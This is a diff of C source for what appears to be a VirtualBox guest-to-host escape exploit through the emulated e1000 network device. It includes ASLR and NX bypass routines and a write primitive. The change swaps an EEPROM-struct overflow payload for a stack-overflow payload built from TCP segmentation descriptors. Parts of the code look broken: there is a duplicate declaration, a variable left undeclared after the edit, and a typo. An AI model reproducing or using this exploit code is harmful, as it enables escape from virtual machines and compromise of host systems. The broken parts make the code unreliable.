@@ -32,8 +32,8 @@ static void heap_overflow(uint16_t new_addr);
 static void buffer_overflow(uint64_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
-static void buffer_overflow(uint64_t new_addr);
-static void nx_bypass(void)
+static void buffer_overflow(void);
+static void nx_bypass(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t* bar0;
@@ -329,9 +329,8 @@ static uint64_t aslr_bypass(void)
     return vboxdd_base;
 }
 
-static void buffer_overflow(uint64_t new_addr)
+static void buffer_overflow(void)
 {
-static int	idx = 0;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -342,26 +341,16 @@ static int	idx = 0;
 	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
-	
-	/* We will overflow on EEProm Struct. Looks like 
-	 *		...
-	 * 		- enum		m_eState			(32 bits)
-	 *		- bool		m_fWriteEnabled		(08 bits)
-	 * 		- uint8_t 	Alignment1			(08 bits)
-     *		- uint16_t	m_u16Word			(16 bits)
-     *		- uint16_t	m_u16Mask			(16 bits)
-     *		- uint16_t	m_u16Addr			(16 bits)
-	 * 		... 
-     */
-    tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
-    tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
-    tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
-    tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
-	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
-    tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
-    tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
-	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
-	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
+	kfree(tx_buffer);
+	tx_buffer = kmalloc(STACK_LEN, GFP_KERNEL);
+	tx_buffer[STACK_LEN - 8] = 0x61;
+	tx_buffer[STACK_LEN - 7] = 0x61;
+	tx_buffer[STACK_LEN - 6] = 0x61;
+	tx_buffer[STACK_LEN - 5] = 0x61;
+	tx_buffer[STACK_LEN - 4] = 0x61;
+	tx_buffer[STACK_LEN - 3] = 0x61;
+	tx_buffer[STACK_LEN - 2] = 0x61;
+	tx_buffer[STACK_LEN - 1] = 0x61;
 	//-----------------------------------------//
 
 	//----------- Descriptors setup -----------//
@@ -382,7 +371,7 @@ static int	idx = 0;
 
 	context_4->lower_setup.ip_config	=	(uint32_t) 0;
 	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
-	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
+	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
 	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
 
 	data_5->buffer_addr					=	(uint64_t) physical_address;
@@ -405,7 +394,7 @@ static void nx_bypass(void)
 	uint32_t rctl = get_register(RCTL) | RCTL_LBM_MAC | RCTL_LBM_SLP;
 	set_register(RCTL, rectl);
 
-
+	buffer_overflow();
 
 	// Disable loopback mode
 	uint32_t rctl = get_register(RCTL) & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
